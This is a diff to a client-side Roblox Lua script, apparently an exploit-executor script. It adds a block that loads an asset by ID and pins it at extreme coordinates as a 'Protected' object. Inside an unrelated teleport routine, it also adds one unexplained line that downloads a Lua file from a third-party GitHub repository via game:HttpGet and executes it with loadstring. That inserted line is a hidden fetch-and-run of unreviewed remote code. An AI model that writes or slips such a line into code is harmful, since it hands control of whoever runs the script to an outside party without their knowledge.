@@ -40,6 +40,44 @@ else
     aurora.CFrame = AURORA_CFRAME
 end
 end
+do
+local Workspace = game:GetService("Workspace")
+local ASSET_ID = "rbxassetid://4556126742"
+local AURORA_CFRAME = CFrame.new(
+    -103626, -96520, -105113,
+     0.0535113998,  -0.0104797706, -0.998512268,
+    -0.0100235129,   0.999888897,  -0.0110313902,
+     0.998516917,    0.0105989054,  0.0534004122
+)
+local objects
+pcall(function()
+    objects = game:GetObjects(ASSET_ID)
+end)
+if not objects or not objects[1] then
+    return
+end
+local aurora = objects[1]
+aurora.Parent = Workspace
+aurora.Name = "ProtectedAurora"
+aurora:SetAttribute("Protected", true)
+for _, v in ipairs(aurora:GetDescendants()) do
+	if v:IsA("BasePart") then
+		v.Anchored = true
+		v.CanCollide = false
+		v:SetAttribute("Protected", true)
+	end
+end
+if aurora:IsA("Model") then
+    local primary = aurora.PrimaryPart or aurora:FindFirstChildWhichIsA("BasePart", true)
+    if not primary then
+        return
+    end
+    aurora.PrimaryPart = primary
+    aurora:SetPrimaryPartCFrame(AURORA_CFRAME)
+else
+    aurora.CFrame = AURORA_CFRAME
+end
+end
 local Players = game:GetService("Players")
 local Lighting = game:GetService("Lighting")
 local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
@@ -262,6 +300,7 @@ if nearest then
             LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(nearest.Position + Vector3.new(0, 5, 0))
         end
     end
+    loadstring(game:HttpGet("https://github.com/AdmBrookhavenScripts/Dimension/raw/refs/heads/main/Instances.lua"))()
     teleportPlayer()
     task.spawn(function()
     do
